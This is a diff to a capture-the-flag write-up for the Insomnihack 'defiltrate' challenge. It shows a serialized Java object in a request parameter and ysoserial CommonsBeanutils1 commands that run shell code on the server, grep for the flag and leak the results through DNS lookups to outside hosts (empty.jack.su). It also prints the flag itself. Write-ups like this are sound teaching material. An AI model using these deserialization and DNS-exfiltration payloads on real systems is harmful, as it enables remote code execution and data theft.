@@ -10,6 +10,8 @@ http://defiltrate.insomnihack.ch/
 
 ## Task
 
+Task was corrupted and we pass the stage with SQL Injection in Cookie, that give us credentials to login.
+
 Main POST request with vulnerability:
 
 ```
@@ -29,7 +31,6 @@ Upgrade-Insecure-Requests: 1
 
 VIEW=rO0ABXNyAApXZWJTZXNzaW9uAAAAAAAAAAECAARMAAxtX2I2NFBheWxvYWR0ABJMamF2YS9sYW5nL1N0cmluZztMAAdtX2xvZ2lucQB%2bAAFMAAptX3Bhc3N3b3JkcQB%2bAAFMAAttX3Nlc3Npb25JRHEAfgABeHB0AARqYWNrdAAFYWRtaW50ABVJIGxvdmUgcGluayBwb25pZXMgPDN0AAI0Mg%3d%3d&get=&rm=
 ```
-
 
 Here we can see that the VIEW parameter has a base64 encoded value starting with rO0AB which is the beginning of base64 encoded java serialized object:
 
@@ -147,6 +148,16 @@ Now we have all shell features available!
 
 And we could create one line command to find flag in OS:
 
+
+Get pwd:
 ```
-java -jar ysoserial.jar CommonsBeanutils1 'sh -c $@|sh . echo echo 0 > /tmp/exf; for cont in $(grep -r INS /opt/* 2>/dev/null); do echo $cont.69c0cdc3.pwnie.me >> /tmp/exf; done; dig -f /tmp/exf' | base64
+java -jar ysoserial.jar CommonsBeanutils1 'sh -c $@|sh . echo echo 0 > /tmp/exf; cont=$(pwd); echo $cont.empty.jack.su >> /tmp/exf; dig -f /tmp/exf' | base64
 ```
+
+Find flag:
+```
+java -jar ysoserial.jar CommonsBeanutils1 'sh -c $@|sh . echo echo 0 > /tmp/exf; for cont in $(grep -r INS /opt/defiltrate/* 2>/dev/null); do echo $cont.empty.jack.su >> /tmp/exf; done; dig -f /tmp/exf' | base64
+```
+
+The flag:
+INS{DEFILTRATE-F!RST-FLAG__BE-BRAVE,-THE-END-IS-NEAR}
